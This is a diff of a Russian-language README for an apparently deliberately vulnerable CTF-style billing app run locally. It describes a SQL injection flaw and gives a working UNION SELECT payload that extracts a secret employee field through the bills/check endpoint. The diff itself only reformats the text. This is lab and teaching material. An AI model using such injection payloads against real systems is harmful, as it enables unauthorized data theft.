@@ -24,18 +24,19 @@ docker-compose up --build
 3. Приложение будет запущено по адресу: [http://localhost:8080](http://localhost:8080)
 
 ## Описание уязвимости конкретно в данном приложении
-Сервис позволяет получить флаг, находящийся в поле secret у сотрудника(таблица employees), выписавшего наибольшую сумму штрафов.
+Сервис позволяет получить флаг, находящийся в поле secret у сотрудника(таблица `employees`), выписавшего наибольшую сумму штрафов.
 Есть хэндлер, который возвращает из бд только поля id штрафа и имя на кого он выписан.
 Для того, чтобы получить флаг, нужно передать вместо имени запрос, который фильтрует и возвращает поле secret у нужной записи.
 
 ## POC-эксплоит для получения флага
 Для получения флага, необходимо получить запись из таблицы, недоступной для получения из хэндлера.
-Сделать это можно воспользовавшись SQL командой UNION, которую нужно использовать в передаваемом тексте.
+Сделать это можно воспользовавшись SQL командой `UNION`, которую нужно использовать в передаваемом тексте.
 Например, подойдет следующий запрос:
-`http://localhost:8080/bills/check?name=' UNION SELECT 0, secret, 0 FROM billdb.employees WHERE id = (SELECT employee_id FROM billdb.bills GROUP BY employee_id ORDER BY SUM(value) DESC LIMIT 1) AND ''='`
+```http://localhost:8080/bills/check?name=' UNION SELECT 0, secret, 0 FROM billdb.employees WHERE id = (SELECT employee_id FROM billdb.bills GROUP BY employee_id ORDER BY SUM(value) DESC LIMIT 1) AND ''='```
 Для него, запрос к БД будет выглядеть следующим образом: 
-`SELECT id, name, value FROM billdb.bills WHERE name='' UNION SELECT 0, secret, 0 FROM billdb.employees WHERE id = (SELECT employee_id FROM billdb.bills GROUP BY employee_id ORDER BY SUM(value) DESC LIMIT 1) AND ''=''`
+```SELECT id, name, value FROM billdb.bills WHERE name='' UNION SELECT 0, secret, 0 FROM billdb.employees WHERE id = (SELECT employee_id FROM billdb.bills GROUP BY employee_id ORDER BY SUM(value) DESC LIMIT 1) AND ''=''```
 В результате запрос вернет поле secret для сотрудника с наибольшей суммой штрафов, что и есть флаг.
 Хэндлер возвращает 3 параметра: id штрафа, name человека, value штрафа, обернутые в текстовую оболочку. 
-При получении флага id и value будут 0, а поле name будет отображать флаг.(Это следует из запроса в примере)
+При получении флага `id` и `value` будут 0, а поле `name` будет отображать флаг(Это следует из запроса в примере).
+
 Выполнение запросов лучше и удобнее всего проводить через программу Postman.
